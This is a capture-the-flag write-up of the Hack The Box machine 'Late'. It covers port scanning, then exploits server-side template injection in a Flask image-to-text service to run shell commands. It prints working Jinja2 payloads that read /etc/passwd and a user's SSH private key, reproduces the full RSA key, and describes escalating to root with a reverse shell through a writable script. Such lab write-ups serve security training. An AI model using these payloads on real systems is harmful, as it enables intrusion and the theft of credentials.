# Late - Easy

![Late.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/Late.png)

[Late](https://app.hackthebox.com/machines/Late) is an Easy linux box, let’s get to enumeration.

## Information Gathering

```bash
┌──(kali㉿kali)-[~/Downloads/ctf/htb/Late]
└─$ export IP=10.10.11.156

┌──(kali㉿kali)-[~/Downloads/ctf/htb/Late]
└─$ nmap $IP                       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 07:52 EDT
Nmap scan report for 10.10.11.156
Host is up (0.55s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 226.62 seconds
```

Let’s perform an initial scan to identify the ports and services that are running on the system

```bash
┌──(kali㉿kali)-[~/Downloads/ctf/htb/Late]
└─$ sudo nmap -Pn -sC -sV -T4 $IP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 07:58 EDT
Nmap scan report for 10.10.11.156
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.10 seconds
```

Add the `$IP` to `/etc/hosts` ie `late.htb`

Go to `late.htb` and inspect the webpage.

While going through the webpage, we find a link in one of the questions that leads to the subdomain `images.late.htb`

Add the subdomain to `/etc/hosts` file.

![late01.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/late01.png)

## Enumeration

On the `images.late.htb` we have a webpage with an upload feature that converts text on image to plain text.

![late02.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/late02.png)

We can try and manipulate the feature and see whether it’s vulnerable to SSTI since it’s running on `flask.`

I used the payload `{{7*7}}` to check for presence of SSTI vulnerability.

Convert the text to image using [https://cloudconvert.com/](https://cloudconvert.com/txt-to-jpg) then upload the payload  which in turn gives us a `results.txt` file.

![late04.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/late04.png)

![late05.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/late05.png)

From this we can see that the site is vulnerable to SSTI as it solved it.

More research can be found in [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) 

We use a one liner payload as below, convert it the payload to image and upload it to get hold of `/etc/passwd` file.

```bash
{{(''.__class__).__mro__[1].__subclasses__()[249]("cat /etc/passwd", stdout=-1,shell=True).communicate() }}
```

Which gives us a results of:

```bash
┌──(kali㉿kali)-[~/…/ctf/htb/Late/images]
└─$ cat resultsss.txt                                              
<p>(b&#39;root:x:0:0:root:/root:/bin/bash\n
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n
bin:x:2:2:bin:/bin:/usr/sbin/nologin\n
sys:x:3:3:sys:/dev:/usr/sbin/nologin\n
sync:x:4:65534:sync:/bin:/bin/sync\n
games:x:5:60:games:/usr/games:/usr/sbin/nologin\n
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\n
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\n
syslog:x:102:106::/home/syslog:/usr/sbin/nologin\n
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\n
lxd:x:105:65534::/var/lib/lxd/:/bin/false\n
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\n
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\n
pollinate:x:109:1::/var/cache/pollinate:/bin/false\n
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin\n
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash\n
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin\n
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n
avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\n
cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\n
saned:x:115:119::/var/lib/saned:/usr/sbin/nologin\n
colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n
pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\n
geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin\n
smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin\n
smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin\n
&#39;, None)
```

From this, the account `svc_acc` is of great interest as it’s home folder is `home/svc_acc`

We can try to get the ssh key and use port 22 to log into the `svc_acc` account. We can find the SSH key by modifying the payload to get : `~/.ssh/id_rsa` and modifying the text to image then uploading it to `images.late.htb`

```bash
{{(''.__class__).__mro__[1].__subclasses__()[249]("cat ~/.ssh/id_rsa", stdout=-1,shell=True).communicate() }}
```

This gives us the following key:

```bash
┌──(kali㉿kali)-[~/Downloads/ctf/htb/Late]
└─$ cat results.txt              
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
```

Rename this file to `id_rsa` then do the following:

```bash
┌──(kali㉿kali)-[~/Downloads/ctf/htb/Late]
└─$ chmod 600 id_rsa  
```

ssh into the file and you will be able to get into the account `svc_acc`

![late07.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/late07.png)

We’ve been able to get the `user.txt` flag, now we can be move on and see if we can get the `root.txt` flag.

### Privilege Escalation

Upload linpeas and run it.

![late08.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/late08.png)

Running linpeas gets us a very interesting flag that we can look at.

![late09.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/late09.png)

![late10.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/late10.png)

The script is executable, therefore we can embed our malicious payload and listen on another terminal to get a reverse shell as root user.

![late11.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/late11.png)

Once we are in we can checkout the root directory for the root flag.

![late12.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/late12.png)

TADAAAAAAAAAAAAAHHHHHHHHHH and we are done!!!!!!!!!

![pwned.png](Late%20-%20Easy%20ea5f4098153c4522b0bfd0aea1a26bee/pwned.png)
